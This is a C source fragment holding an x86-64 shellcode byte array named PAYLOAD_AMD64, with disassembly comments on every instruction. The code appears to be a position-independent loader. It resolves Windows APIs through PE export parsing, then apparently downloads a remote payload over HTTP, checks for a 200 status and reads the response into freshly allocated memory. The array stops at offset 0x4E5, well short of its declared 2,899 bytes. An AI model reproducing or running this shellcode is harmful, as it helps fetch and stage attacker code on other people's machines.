
// Target architecture : X86 64

#define PAYLOAD_AMD64_SIZE 2899

char PAYLOAD_AMD64[] = {
  /* 0000 */ "\x48\x89\x5c\x24\x08"                     /* mov       qword ptr [rsp + 8], rbx             */
  /* 0005 */ "\x48\x89\x74\x24\x10"                     /* mov       qword ptr [rsp + 0x10], rsi          */
  /* 000A */ "\x57"                                     /* push      rdi                                  */
  /* 000B */ "\x48\x83\xec\x20"                         /* sub       rsp, 0x20                            */
  /* 000F */ "\x48\x8b\x91\x28\x01\x00\x00"             /* mov       rdx, qword ptr [rcx + 0x128]         */
  /* 0016 */ "\x48\x8b\xf9"                             /* mov       rdi, rcx                             */
  /* 0019 */ "\x48\x8b\x89\x38\x01\x00\x00"             /* mov       rcx, qword ptr [rcx + 0x138]         */
  /* 0020 */ "\xe8\x6b\x09\x00\x00"                     /* call      0x990                                */
  /* 0025 */ "\x48\x89\x87\x38\x01\x00\x00"             /* mov       qword ptr [rdi + 0x138], rax         */
  /* 002C */ "\x48\x85\xc0"                             /* test      rax, rax                             */
  /* 002F */ "\x74\x72"                                 /* je        0xa3                                 */
  /* 0031 */ "\x33\xdb"                                 /* xor       ebx, ebx                             */
  /* 0033 */ "\x39\x5f\x20"                             /* cmp       dword ptr [rdi + 0x20], ebx          */
  /* 0036 */ "\x76\x1a"                                 /* jbe       0x52                                 */
  /* 0038 */ "\x8b\xc3"                                 /* mov       eax, ebx                             */
  /* 003A */ "\x48\x8d\x4f\x24"                         /* lea       rcx, qword ptr [rdi + 0x24]          */
  /* 003E */ "\x48\xc1\xe0\x05"                         /* shl       rax, 5                               */
  /* 0042 */ "\x48\x03\xc8"                             /* add       rcx, rax                             */
  /* 0045 */ "\xff\x97\x38\x01\x00\x00"                 /* call      qword ptr [rdi + 0x138]              */
  /* 004B */ "\xff\xc3"                                 /* inc       ebx                                  */
  /* 004D */ "\x3b\x5f\x20"                             /* cmp       ebx, dword ptr [rdi + 0x20]          */
  /* 0050 */ "\x72\xe6"                                 /* jb        0x38                                 */
  /* 0052 */ "\xbe\x01\x00\x00\x00"                     /* mov       esi, 1                               */
  /* 0057 */ "\x39\xb7\x30\x01\x00\x00"                 /* cmp       dword ptr [rdi + 0x130], esi         */
  /* 005D */ "\x76\x2d"                                 /* jbe       0x8c                                 */
  /* 005F */ "\x48\x8b\x97\x28\x01\x00\x00"             /* mov       rdx, qword ptr [rdi + 0x128]         */
  /* 0066 */ "\x8b\xde"                                 /* mov       ebx, esi                             */
  /* 0068 */ "\x48\x8b\x8c\xdf\x38\x01\x00\x00"         /* mov       rcx, qword ptr [rdi + rbx*8 + 0x138] */
  /* 0070 */ "\xe8\x1b\x09\x00\x00"                     /* call      0x990                                */
  /* 0075 */ "\x48\x89\x84\xdf\x38\x01\x00\x00"         /* mov       qword ptr [rdi + rbx*8 + 0x138], rax */
  /* 007D */ "\x48\x85\xc0"                             /* test      rax, rax                             */
  /* 0080 */ "\x74\x21"                                 /* je        0xa3                                 */
  /* 0082 */ "\xff\xc6"                                 /* inc       esi                                  */
  /* 0084 */ "\x3b\xb7\x30\x01\x00\x00"                 /* cmp       esi, dword ptr [rdi + 0x130]         */
  /* 008A */ "\x72\xd3"                                 /* jb        0x5f                                 */
  /* 008C */ "\x8b\x87\x18\x03\x00\x00"                 /* mov       eax, dword ptr [rdi + 0x318]         */
  /* 0092 */ "\x83\xf8\x03"                             /* cmp       eax, 3                               */
  /* 0095 */ "\x75\x1f"                                 /* jne       0xb6                                 */
  /* 0097 */ "\x48\x8b\xcf"                             /* mov       rcx, rdi                             */
  /* 009A */ "\xe8\x25\x01\x00\x00"                     /* call      0x1c4                                */
  /* 009F */ "\x85\xc0"                                 /* test      eax, eax                             */
  /* 00A1 */ "\x75\x22"                                 /* jne       0xc5                                 */
  /* 00A3 */ "\x83\xc8\xff"                             /* or        eax, 0xffffffff                      */
  /* 00A6 */ "\x48\x8b\x5c\x24\x30"                     /* mov       rbx, qword ptr [rsp + 0x30]          */
  /* 00AB */ "\x48\x8b\x74\x24\x38"                     /* mov       rsi, qword ptr [rsp + 0x38]          */
  /* 00B0 */ "\x48\x83\xc4\x20"                         /* add       rsp, 0x20                            */
  /* 00B4 */ "\x5f"                                     /* pop       rdi                                  */
  /* 00B5 */ "\xc3"                                     /* ret                                            */
  /* 00B6 */ "\x83\xf8\x02"                             /* cmp       eax, 2                               */
  /* 00B9 */ "\x75\x0a"                                 /* jne       0xc5                                 */
  /* 00BB */ "\x48\x8b\xcf"                             /* mov       rcx, rdi                             */
  /* 00BE */ "\xe8\x89\x01\x00\x00"                     /* call      0x24c                                */
  /* 00C3 */ "\xeb\xda"                                 /* jmp       0x9f                                 */
  /* 00C5 */ "\x48\x8b\xcf"                             /* mov       rcx, rdi                             */
  /* 00C8 */ "\xe8\xe7\x06\x00\x00"                     /* call      0x7b4                                */
  /* 00CD */ "\x85\xc0"                                 /* test      eax, eax                             */
  /* 00CF */ "\x74\xd2"                                 /* je        0xa3                                 */
  /* 00D1 */ "\x48\x8b\xcf"                             /* mov       rcx, rdi                             */
  /* 00D4 */ "\xe8\xdb\x03\x00\x00"                     /* call      0x4b4                                */
  /* 00D9 */ "\x33\xc0"                                 /* xor       eax, eax                             */
  /* 00DB */ "\xeb\xc9"                                 /* jmp       0xa6                                 */
  /* 00DD */ "\xcc"                                     /* int3                                           */
  /* 00DE */ "\xcc"                                     /* int3                                           */
  /* 00DF */ "\xcc"                                     /* int3                                           */
  /* 00E0 */ "\x48\x8b\xc4"                             /* mov       rax, rsp                             */
  /* 00E3 */ "\x48\x89\x58\x08"                         /* mov       qword ptr [rax + 8], rbx             */
  /* 00E7 */ "\x48\x89\x68\x18"                         /* mov       qword ptr [rax + 0x18], rbp          */
  /* 00EB */ "\x48\x89\x70\x20"                         /* mov       qword ptr [rax + 0x20], rsi          */
  /* 00EF */ "\x48\x89\x50\x10"                         /* mov       qword ptr [rax + 0x10], rdx          */
  /* 00F3 */ "\x57"                                     /* push      rdi                                  */
  /* 00F4 */ "\x41\x54"                                 /* push      r12                                  */
  /* 00F6 */ "\x41\x55"                                 /* push      r13                                  */
  /* 00F8 */ "\x41\x56"                                 /* push      r14                                  */
  /* 00FA */ "\x41\x57"                                 /* push      r15                                  */
  /* 00FC */ "\x48\x81\xec\x30\x01\x00\x00"             /* sub       rsp, 0x130                           */
  /* 0103 */ "\x48\x63\x41\x3c"                         /* movsxd    rax, dword ptr [rcx + 0x3c]          */
  /* 0107 */ "\x48\x8b\xd9"                             /* mov       rbx, rcx                             */
  /* 010A */ "\x4d\x8b\xf8"                             /* mov       r15, r8                              */
  /* 010D */ "\x8b\x8c\x08\x88\x00\x00\x00"             /* mov       ecx, dword ptr [rax + rcx + 0x88]    */
  /* 0114 */ "\x85\xc9"                                 /* test      ecx, ecx                             */
  /* 0116 */ "\x74\x7b"                                 /* je        0x193                                */
  /* 0118 */ "\x48\x8d\x04\x0b"                         /* lea       rax, qword ptr [rbx + rcx]           */
  /* 011C */ "\x8b\x78\x18"                             /* mov       edi, dword ptr [rax + 0x18]          */
  /* 011F */ "\x85\xff"                                 /* test      edi, edi                             */
  /* 0121 */ "\x74\x70"                                 /* je        0x193                                */
  /* 0123 */ "\x8b\x68\x1c"                             /* mov       ebp, dword ptr [rax + 0x1c]          */
  /* 0126 */ "\x33\xc9"                                 /* xor       ecx, ecx                             */
  /* 0128 */ "\x44\x8b\x68\x20"                         /* mov       r13d, dword ptr [rax + 0x20]         */
  /* 012C */ "\x48\x03\xeb"                             /* add       rbp, rbx                             */
  /* 012F */ "\x44\x8b\x70\x24"                         /* mov       r14d, dword ptr [rax + 0x24]         */
  /* 0133 */ "\x4c\x03\xeb"                             /* add       r13, rbx                             */
  /* 0136 */ "\x8b\x40\x0c"                             /* mov       eax, dword ptr [rax + 0xc]           */
  /* 0139 */ "\x4c\x03\xf3"                             /* add       r14, rbx                             */
  /* 013C */ "\x4c\x8d\x04\x18"                         /* lea       r8, qword ptr [rax + rbx]            */
  /* 0140 */ "\x41\x8a\x00"                             /* mov       al, byte ptr [r8]                    */
  /* 0143 */ "\x84\xc0"                                 /* test      al, al                               */
  /* 0145 */ "\x74\x14"                                 /* je        0x15b                                */
  /* 0147 */ "\x33\xd2"                                 /* xor       edx, edx                             */
  /* 0149 */ "\xff\xc1"                                 /* inc       ecx                                  */
  /* 014B */ "\x0c\x20"                                 /* or        al, 0x20                             */
  /* 014D */ "\x88\x44\x14\x20"                         /* mov       byte ptr [rsp + rdx + 0x20], al      */
  /* 0151 */ "\x8b\xd1"                                 /* mov       edx, ecx                             */
  /* 0153 */ "\x42\x8a\x04\x01"                         /* mov       al, byte ptr [rcx + r8]              */
  /* 0157 */ "\x84\xc0"                                 /* test      al, al                               */
  /* 0159 */ "\x75\xee"                                 /* jne       0x149                                */
  /* 015B */ "\xc6\x44\x0c\x20\x00"                     /* mov       byte ptr [rsp + rcx + 0x20], 0       */
  /* 0160 */ "\x49\x8b\xd7"                             /* mov       rdx, r15                             */
  /* 0163 */ "\x48\x8d\x4c\x24\x20"                     /* lea       rcx, qword ptr [rsp + 0x20]          */
  /* 0168 */ "\xe8\x83\x08\x00\x00"                     /* call      0x9f0                                */
  /* 016D */ "\x4c\x8b\xe0"                             /* mov       r12, rax                             */
  /* 0170 */ "\xff\xcf"                                 /* dec       edi                                  */
  /* 0172 */ "\x49\x8b\xd7"                             /* mov       rdx, r15                             */
  /* 0175 */ "\x41\x8b\x4c\xbd\x00"                     /* mov       ecx, dword ptr [r13 + rdi*4]         */
  /* 017A */ "\x48\x03\xcb"                             /* add       rcx, rbx                             */
  /* 017D */ "\xe8\x6e\x08\x00\x00"                     /* call      0x9f0                                */
  /* 0182 */ "\x49\x03\xc4"                             /* add       rax, r12                             */
  /* 0185 */ "\x48\x3b\x84\x24\x68\x01\x00\x00"         /* cmp       rax, qword ptr [rsp + 0x168]         */
  /* 018D */ "\x74\x27"                                 /* je        0x1b6                                */
  /* 018F */ "\x85\xff"                                 /* test      edi, edi                             */
  /* 0191 */ "\x75\xdd"                                 /* jne       0x170                                */
  /* 0193 */ "\x33\xc0"                                 /* xor       eax, eax                             */
  /* 0195 */ "\x4c\x8d\x9c\x24\x30\x01\x00\x00"         /* lea       r11, qword ptr [rsp + 0x130]         */
  /* 019D */ "\x49\x8b\x5b\x30"                         /* mov       rbx, qword ptr [r11 + 0x30]          */
  /* 01A1 */ "\x49\x8b\x6b\x40"                         /* mov       rbp, qword ptr [r11 + 0x40]          */
  /* 01A5 */ "\x49\x8b\x73\x48"                         /* mov       rsi, qword ptr [r11 + 0x48]          */
  /* 01A9 */ "\x49\x8b\xe3"                             /* mov       rsp, r11                             */
  /* 01AC */ "\x41\x5f"                                 /* pop       r15                                  */
  /* 01AE */ "\x41\x5e"                                 /* pop       r14                                  */
  /* 01B0 */ "\x41\x5d"                                 /* pop       r13                                  */
  /* 01B2 */ "\x41\x5c"                                 /* pop       r12                                  */
  /* 01B4 */ "\x5f"                                     /* pop       rdi                                  */
  /* 01B5 */ "\xc3"                                     /* ret                                            */
  /* 01B6 */ "\x41\x0f\xb7\x04\x7e"                     /* movzx     eax, word ptr [r14 + rdi*2]          */
  /* 01BB */ "\x8b\x44\x85\x00"                         /* mov       eax, dword ptr [rbp + rax*4]         */
  /* 01BF */ "\x48\x03\xc3"                             /* add       rax, rbx                             */
  /* 01C2 */ "\xeb\xd1"                                 /* jmp       0x195                                */
  /* 01C4 */ "\x48\x89\x5c\x24\x08"                     /* mov       qword ptr [rsp + 8], rbx             */
  /* 01C9 */ "\x48\x89\x74\x24\x10"                     /* mov       qword ptr [rsp + 0x10], rsi          */
  /* 01CE */ "\x57"                                     /* push      rdi                                  */
  /* 01CF */ "\x48\x83\xec\x20"                         /* sub       rsp, 0x20                            */
  /* 01D3 */ "\x48\x8b\xd9"                             /* mov       rbx, rcx                             */
  /* 01D6 */ "\x4c\x8d\x81\x3c\x03\x00\x00"             /* lea       r8, qword ptr [rcx + 0x33c]          */
  /* 01DD */ "\x48\x8d\x91\x1c\x03\x00\x00"             /* lea       rdx, qword ptr [rcx + 0x31c]         */
  /* 01E4 */ "\x33\xc9"                                 /* xor       ecx, ecx                             */
  /* 01E6 */ "\xff\x93\x58\x01\x00\x00"                 /* call      qword ptr [rbx + 0x158]              */
  /* 01EC */ "\x33\xff"                                 /* xor       edi, edi                             */
  /* 01EE */ "\x48\x8b\xf0"                             /* mov       rsi, rax                             */
  /* 01F1 */ "\x48\x85\xc0"                             /* test      rax, rax                             */
  /* 01F4 */ "\x74\x43"                                 /* je        0x239                                */
  /* 01F6 */ "\x48\x8b\xd0"                             /* mov       rdx, rax                             */
  /* 01F9 */ "\x33\xc9"                                 /* xor       ecx, ecx                             */
  /* 01FB */ "\xff\x93\x60\x01\x00\x00"                 /* call      qword ptr [rbx + 0x160]              */
  /* 0201 */ "\x48\x85\xc0"                             /* test      rax, rax                             */
  /* 0204 */ "\x74\x33"                                 /* je        0x239                                */
  /* 0206 */ "\x48\x8b\xc8"                             /* mov       rcx, rax                             */
  /* 0209 */ "\xff\x93\x68\x01\x00\x00"                 /* call      qword ptr [rbx + 0x168]              */
  /* 020F */ "\x48\x8b\xd6"                             /* mov       rdx, rsi                             */
  /* 0212 */ "\x33\xc9"                                 /* xor       ecx, ecx                             */
  /* 0214 */ "\x48\x89\x83\xd8\x05\x00\x00"             /* mov       qword ptr [rbx + 0x5d8], rax         */
  /* 021B */ "\xff\x93\x70\x01\x00\x00"                 /* call      qword ptr [rbx + 0x170]              */
  /* 0221 */ "\x48\x39\xbb\xd8\x05\x00\x00"             /* cmp       qword ptr [rbx + 0x5d8], rdi         */
  /* 0228 */ "\x8b\xc8"                                 /* mov       ecx, eax                             */
  /* 022A */ "\x40\x0f\x95\xc7"                         /* setne     dil                                  */
  /* 022E */ "\x48\x89\x8b\xd0\x05\x00\x00"             /* mov       qword ptr [rbx + 0x5d0], rcx         */
  /* 0235 */ "\x8b\xc7"                                 /* mov       eax, edi                             */
  /* 0237 */ "\xeb\x02"                                 /* jmp       0x23b                                */
  /* 0239 */ "\x33\xc0"                                 /* xor       eax, eax                             */
  /* 023B */ "\x48\x8b\x5c\x24\x30"                     /* mov       rbx, qword ptr [rsp + 0x30]          */
  /* 0240 */ "\x48\x8b\x74\x24\x38"                     /* mov       rsi, qword ptr [rsp + 0x38]          */
  /* 0245 */ "\x48\x83\xc4\x20"                         /* add       rsp, 0x20                            */
  /* 0249 */ "\x5f"                                     /* pop       rdi                                  */
  /* 024A */ "\xc3"                                     /* ret                                            */
  /* 024B */ "\xcc"                                     /* int3                                           */
  /* 024C */ "\x40\x55"                                 /* push      rbp                                  */
  /* 024E */ "\x53"                                     /* push      rbx                                  */
  /* 024F */ "\x56"                                     /* push      rsi                                  */
  /* 0250 */ "\x57"                                     /* push      rdi                                  */
  /* 0251 */ "\x41\x54"                                 /* push      r12                                  */
  /* 0253 */ "\x41\x55"                                 /* push      r13                                  */
  /* 0255 */ "\x41\x56"                                 /* push      r14                                  */
  /* 0257 */ "\x41\x57"                                 /* push      r15                                  */
  /* 0259 */ "\x48\x8d\xac\x24\x48\xff\xff\xff"         /* lea       rbp, qword ptr [rsp - 0xb8]          */
  /* 0261 */ "\x48\x81\xec\xb8\x01\x00\x00"             /* sub       rsp, 0x1b8                           */
  /* 0268 */ "\x33\xc0"                                 /* xor       eax, eax                             */
  /* 026A */ "\x48\x8d\x7c\x24\x40"                     /* lea       rdi, qword ptr [rsp + 0x40]          */
  /* 026F */ "\x48\x8b\xf1"                             /* mov       rsi, rcx                             */
  /* 0272 */ "\x4c\x8d\x4c\x24\x40"                     /* lea       r9, qword ptr [rsp + 0x40]           */
  /* 0277 */ "\x33\xdb"                                 /* xor       ebx, ebx                             */
  /* 0279 */ "\x41\xb8\x00\x00\x00\x10"                 /* mov       r8d, 0x10000000                      */
  /* 027F */ "\x89\x9d\x08\x01\x00\x00"                 /* mov       dword ptr [rbp + 0x108], ebx         */
  /* 0285 */ "\x41\xbe\x00\x02\x60\x84"                 /* mov       r14d, 0x84600200                     */
  /* 028B */ "\x8d\x53\x68"                             /* lea       edx, dword ptr [rbx + 0x68]          */
  /* 028E */ "\x8b\xca"                                 /* mov       ecx, edx                             */
  /* 0290 */ "\xf3\xaa"                                 /* rep stosb byte ptr [rdi], al                   */
  /* 0292 */ "\x48\x8d\x45\xb0"                         /* lea       rax, qword ptr [rbp - 0x50]          */
  /* 0296 */ "\x89\x54\x24\x40"                         /* mov       dword ptr [rsp + 0x40], edx          */
  /* 029A */ "\x48\x89\x44\x24\x58"                     /* mov       qword ptr [rsp + 0x58], rax          */
  /* 029F */ "\x48\x8d\x8e\x1c\x03\x00\x00"             /* lea       rcx, qword ptr [rsi + 0x31c]         */
  /* 02A6 */ "\x48\x8d\x45\x30"                         /* lea       rax, qword ptr [rbp + 0x30]          */
  /* 02AA */ "\x48\x89\x45\x88"                         /* mov       qword ptr [rbp - 0x78], rax          */
  /* 02AE */ "\x8d\x42\x18"                             /* lea       eax, dword ptr [rdx + 0x18]          */
  /* 02B1 */ "\x33\xd2"                                 /* xor       edx, edx                             */
  /* 02B3 */ "\x89\x44\x24\x60"                         /* mov       dword ptr [rsp + 0x60], eax          */
  /* 02B7 */ "\x89\x45\x90"                             /* mov       dword ptr [rbp - 0x70], eax          */
  /* 02BA */ "\xff\x96\xb0\x01\x00\x00"                 /* call      qword ptr [rsi + 0x1b0]              */
  /* 02C0 */ "\x85\xc0"                                 /* test      eax, eax                             */
  /* 02C2 */ "\x0f\x84\xd5\x01\x00\x00"                 /* je        0x49d                                */
  /* 02C8 */ "\x83\x7c\x24\x54\x04"                     /* cmp       dword ptr [rsp + 0x54], 4            */
  /* 02CD */ "\xb8\x00\x32\xe0\x84"                     /* mov       eax, 0x84e03200                      */
  /* 02D2 */ "\x44\x8b\xfb"                             /* mov       r15d, ebx                            */
  /* 02D5 */ "\x89\x5c\x24\x20"                         /* mov       dword ptr [rsp + 0x20], ebx          */
  /* 02D9 */ "\x41\x0f\x94\xc7"                         /* sete      r15b                                 */
  /* 02DD */ "\x44\x0f\x44\xf0"                         /* cmove     r14d, eax                            */
  /* 02E1 */ "\x45\x33\xc9"                             /* xor       r9d, r9d                             */
  /* 02E4 */ "\x45\x33\xc0"                             /* xor       r8d, r8d                             */
  /* 02E7 */ "\x33\xd2"                                 /* xor       edx, edx                             */
  /* 02E9 */ "\x33\xc9"                                 /* xor       ecx, ecx                             */
  /* 02EB */ "\xff\x96\xb8\x01\x00\x00"                 /* call      qword ptr [rsi + 0x1b8]              */
  /* 02F1 */ "\x4c\x8b\xe8"                             /* mov       r13, rax                             */
  /* 02F4 */ "\x48\x85\xc0"                             /* test      rax, rax                             */
  /* 02F7 */ "\x0f\x84\xa0\x01\x00\x00"                 /* je        0x49d                                */
  /* 02FD */ "\x48\x89\x5c\x24\x38"                     /* mov       qword ptr [rsp + 0x38], rbx          */
  /* 0302 */ "\x48\x8d\x55\xb0"                         /* lea       rdx, qword ptr [rbp - 0x50]          */
  /* 0306 */ "\x41\x8b\xcf"                             /* mov       ecx, r15d                            */
  /* 0309 */ "\x89\x5c\x24\x30"                         /* mov       dword ptr [rsp + 0x30], ebx          */
  /* 030D */ "\xf7\xd9"                                 /* neg       ecx                                  */
  /* 030F */ "\xc7\x44\x24\x28\x03\x00\x00\x00"         /* mov       dword ptr [rsp + 0x28], 3            */
  /* 0317 */ "\x48\x8b\xc8"                             /* mov       rcx, rax                             */
  /* 031A */ "\x48\x89\x5c\x24\x20"                     /* mov       qword ptr [rsp + 0x20], rbx          */
  /* 031F */ "\x66\x45\x1b\xc0"                         /* sbb       r8w, r8w                             */
  /* 0323 */ "\x45\x33\xc9"                             /* xor       r9d, r9d                             */
  /* 0326 */ "\x66\x41\x81\xe0\x6b\x01"                 /* and       r8w, 0x16b                           */
  /* 032C */ "\x66\x41\x83\xc0\x50"                     /* add       r8w, 0x50                            */
  /* 0331 */ "\xff\x96\xc0\x01\x00\x00"                 /* call      qword ptr [rsi + 0x1c0]              */
  /* 0337 */ "\x4c\x8b\xe0"                             /* mov       r12, rax                             */
  /* 033A */ "\x48\x85\xc0"                             /* test      rax, rax                             */
  /* 033D */ "\x0f\x84\x4d\x01\x00\x00"                 /* je        0x490                                */
  /* 0343 */ "\x48\x89\x5c\x24\x38"                     /* mov       qword ptr [rsp + 0x38], rbx          */
  /* 0348 */ "\x48\x8d\x96\x9c\x03\x00\x00"             /* lea       rdx, qword ptr [rsi + 0x39c]         */
  /* 034F */ "\x44\x89\x74\x24\x30"                     /* mov       dword ptr [rsp + 0x30], r14d         */
  /* 0354 */ "\x4c\x8d\x45\x30"                         /* lea       r8, qword ptr [rbp + 0x30]           */
  /* 0358 */ "\x48\x89\x5c\x24\x28"                     /* mov       qword ptr [rsp + 0x28], rbx          */
  /* 035D */ "\x45\x33\xc9"                             /* xor       r9d, r9d                             */
  /* 0360 */ "\x48\x8b\xc8"                             /* mov       rcx, rax                             */
  /* 0363 */ "\x48\x89\x5c\x24\x20"                     /* mov       qword ptr [rsp + 0x20], rbx          */
  /* 0368 */ "\xff\x96\xe0\x01\x00\x00"                 /* call      qword ptr [rsi + 0x1e0]              */
  /* 036E */ "\x48\x8b\xf8"                             /* mov       rdi, rax                             */
  /* 0371 */ "\x48\x85\xc0"                             /* test      rax, rax                             */
  /* 0374 */ "\x0f\x84\x0d\x01\x00\x00"                 /* je        0x487                                */
  /* 037A */ "\x45\x85\xff"                             /* test      r15d, r15d                           */
  /* 037D */ "\x74\x28"                                 /* je        0x3a7                                */
  /* 037F */ "\x41\x0f\xba\xe6\x0c"                     /* bt        r14d, 0xc                            */
  /* 0384 */ "\x73\x21"                                 /* jae       0x3a7                                */
  /* 0386 */ "\x44\x8d\x4b\x04"                         /* lea       r9d, dword ptr [rbx + 4]             */
  /* 038A */ "\xc7\x85\x10\x01\x00\x00\x80\x33\x00\x00" /* mov       dword ptr [rbp + 0x110], 0x3380      */
  /* 0394 */ "\x4c\x8d\x85\x10\x01\x00\x00"             /* lea       r8, qword ptr [rbp + 0x110]          */
  /* 039B */ "\x48\x8b\xc8"                             /* mov       rcx, rax                             */
  /* 039E */ "\x8d\x53\x1f"                             /* lea       edx, dword ptr [rbx + 0x1f]          */
  /* 03A1 */ "\xff\x96\xc8\x01\x00\x00"                 /* call      qword ptr [rsi + 0x1c8]              */
  /* 03A7 */ "\x45\x33\xc9"                             /* xor       r9d, r9d                             */
  /* 03AA */ "\x89\x5c\x24\x20"                         /* mov       dword ptr [rsp + 0x20], ebx          */
  /* 03AE */ "\x45\x33\xc0"                             /* xor       r8d, r8d                             */
  /* 03B1 */ "\x33\xd2"                                 /* xor       edx, edx                             */
  /* 03B3 */ "\x48\x8b\xcf"                             /* mov       rcx, rdi                             */
  /* 03B6 */ "\xff\x96\xe8\x01\x00\x00"                 /* call      qword ptr [rsi + 0x1e8]              */
  /* 03BC */ "\x85\xc0"                                 /* test      eax, eax                             */
  /* 03BE */ "\x0f\x84\xba\x00\x00\x00"                 /* je        0x47e                                */
  /* 03C4 */ "\x4c\x8d\x8d\x00\x01\x00\x00"             /* lea       r9, qword ptr [rbp + 0x100]          */
  /* 03CB */ "\xc7\x85\x00\x01\x00\x00\x04\x00\x00\x00" /* mov       dword ptr [rbp + 0x100], 4           */
  /* 03D5 */ "\x4c\x8d\x85\x08\x01\x00\x00"             /* lea       r8, qword ptr [rbp + 0x108]          */
  /* 03DC */ "\x48\x89\x5c\x24\x20"                     /* mov       qword ptr [rsp + 0x20], rbx          */
  /* 03E1 */ "\xba\x13\x00\x00\x20"                     /* mov       edx, 0x20000013                      */
  /* 03E6 */ "\x48\x8b\xcf"                             /* mov       rcx, rdi                             */
  /* 03E9 */ "\xff\x96\xf0\x01\x00\x00"                 /* call      qword ptr [rsi + 0x1f0]              */
  /* 03EF */ "\x85\xc0"                                 /* test      eax, eax                             */
  /* 03F1 */ "\x0f\x84\x87\x00\x00\x00"                 /* je        0x47e                                */
  /* 03F7 */ "\x81\xbd\x08\x01\x00\x00\xc8\x00\x00\x00" /* cmp       dword ptr [rbp + 0x108], 0xc8        */
  /* 0401 */ "\x75\x7b"                                 /* jne       0x47e                                */
  /* 0403 */ "\x4c\x8d\xb6\xd0\x05\x00\x00"             /* lea       r14, qword ptr [rsi + 0x5d0]         */
  /* 040A */ "\xc7\x85\x00\x01\x00\x00\x08\x00\x00\x00" /* mov       dword ptr [rbp + 0x100], 8           */
  /* 0414 */ "\x4d\x8b\xc6"                             /* mov       r8, r14                              */
  /* 0417 */ "\x49\x89\x1e"                             /* mov       qword ptr [r14], rbx                 */
  /* 041A */ "\x4c\x8d\x8d\x00\x01\x00\x00"             /* lea       r9, qword ptr [rbp + 0x100]          */
  /* 0421 */ "\x48\x89\x5c\x24\x20"                     /* mov       qword ptr [rsp + 0x20], rbx          */
  /* 0426 */ "\xba\x05\x00\x00\x20"                     /* mov       edx, 0x20000005                      */
  /* 042B */ "\x48\x8b\xcf"                             /* mov       rcx, rdi                             */
  /* 042E */ "\xff\x96\xf0\x01\x00\x00"                 /* call      qword ptr [rsi + 0x1f0]              */
  /* 0434 */ "\x85\xc0"                                 /* test      eax, eax                             */
  /* 0436 */ "\x74\x46"                                 /* je        0x47e                                */
  /* 0438 */ "\x49\x39\x1e"                             /* cmp       qword ptr [r14], rbx                 */
  /* 043B */ "\x74\x41"                                 /* je        0x47e                                */
  /* 043D */ "\x49\x8b\x16"                             /* mov       rdx, qword ptr [r14]                 */
  /* 0440 */ "\x41\xb9\x04\x00\x00\x00"                 /* mov       r9d, 4                               */
  /* 0446 */ "\x41\xb8\x00\x30\x00\x00"                 /* mov       r8d, 0x3000                          */
  /* 044C */ "\x33\xc9"                                 /* xor       ecx, ecx                             */
  /* 044E */ "\xff\x96\x40\x01\x00\x00"                 /* call      qword ptr [rsi + 0x140]              */
  /* 0454 */ "\x48\x89\x86\xd8\x05\x00\x00"             /* mov       qword ptr [rsi + 0x5d8], rax         */
  /* 045B */ "\x48\x85\xc0"                             /* test      rax, rax                             */
  /* 045E */ "\x74\x1e"                                 /* je        0x47e                                */
  /* 0460 */ "\x45\x8b\x06"                             /* mov       r8d, dword ptr [r14]                 */
  /* 0463 */ "\x4c\x8d\x8d\x18\x01\x00\x00"             /* lea       r9, qword ptr [rbp + 0x118]          */
  /* 046A */ "\x48\x8b\xd0"                             /* mov       rdx, rax                             */
  /* 046D */ "\x89\x9d\x18\x01\x00\x00"                 /* mov       dword ptr [rbp + 0x118], ebx         */
  /* 0473 */ "\x48\x8b\xcf"                             /* mov       rcx, rdi                             */
  /* 0476 */ "\xff\x96\xd0\x01\x00\x00"                 /* call      qword ptr [rsi + 0x1d0]              */
  /* 047C */ "\x8b\xd8"                                 /* mov       ebx, eax                             */
  /* 047E */ "\x48\x8b\xcf"                             /* mov       rcx, rdi                             */
  /* 0481 */ "\xff\x96\xd8\x01\x00\x00"                 /* call      qword ptr [rsi + 0x1d8]              */
  /* 0487 */ "\x49\x8b\xcc"                             /* mov       rcx, r12                             */
  /* 048A */ "\xff\x96\xd8\x01\x00\x00"                 /* call      qword ptr [rsi + 0x1d8]              */
  /* 0490 */ "\x49\x8b\xcd"                             /* mov       rcx, r13                             */
  /* 0493 */ "\xff\x96\xd8\x01\x00\x00"                 /* call      qword ptr [rsi + 0x1d8]              */
  /* 0499 */ "\x8b\xc3"                                 /* mov       eax, ebx                             */
  /* 049B */ "\xeb\x02"                                 /* jmp       0x49f                                */
  /* 049D */ "\x33\xc0"                                 /* xor       eax, eax                             */
  /* 049F */ "\x48\x81\xc4\xb8\x01\x00\x00"             /* add       rsp, 0x1b8                           */
  /* 04A6 */ "\x41\x5f"                                 /* pop       r15                                  */
  /* 04A8 */ "\x41\x5e"                                 /* pop       r14                                  */
  /* 04AA */ "\x41\x5d"                                 /* pop       r13                                  */
  /* 04AC */ "\x41\x5c"                                 /* pop       r12                                  */
  /* 04AE */ "\x5f"                                     /* pop       rdi                                  */
  /* 04AF */ "\x5e"                                     /* pop       rsi                                  */
  /* 04B0 */ "\x5b"                                     /* pop       rbx                                  */
  /* 04B1 */ "\x5d"                                     /* pop       rbp                                  */
  /* 04B2 */ "\xc3"                                     /* ret                                            */
  /* 04B3 */ "\xcc"                                     /* int3                                           */
  /* 04B4 */ "\x40\x55"                                 /* push      rbp                                  */
  /* 04B6 */ "\x53"                                     /* push      rbx                                  */
  /* 04B7 */ "\x56"                                     /* push      rsi                                  */
  /* 04B8 */ "\x57"                                     /* push      rdi                                  */
  /* 04B9 */ "\x41\x54"                                 /* push      r12                                  */
  /* 04BB */ "\x41\x56"                                 /* push      r14                                  */
  /* 04BD */ "\x41\x57"                                 /* push      r15                                  */
  /* 04BF */ "\x48\x8d\x6c\x24\xd9"                     /* lea       rbp, qword ptr [rsp - 0x27]          */
  /* 04C4 */ "\x48\x81\xec\xe0\x00\x00\x00"             /* sub       rsp, 0xe0                            */
  /* 04CB */ "\x83\xb9\x18\x03\x00\x00\x01"             /* cmp       dword ptr [rcx + 0x318], 1           */
  /* 04D2 */ "\x48\x8d\xb1\xd8\x05\x00\x00"             /* lea       rsi, qword ptr [rcx + 0x5d8]         */
  /* 04D9 */ "\x48\x8b\xd9"                             /* mov       rbx, rcx                             */
  /* 04DC */ "\x74\x03"                                 /* je        0x4e1                                */
  /* 04DE */ "\x48\x8b\x36"                             /* mov       rsi, qword ptr [rsi]                 */
  /* 04E1 */ "\x83\x65\x8b\x00"                         /* and       dword ptr [rbp - 0x75], 0            */
  /* 04E5 */ "\x4c\x8d\x45\x87"                         /* lea       r8, qword ptr [rbp - 0x79]           */
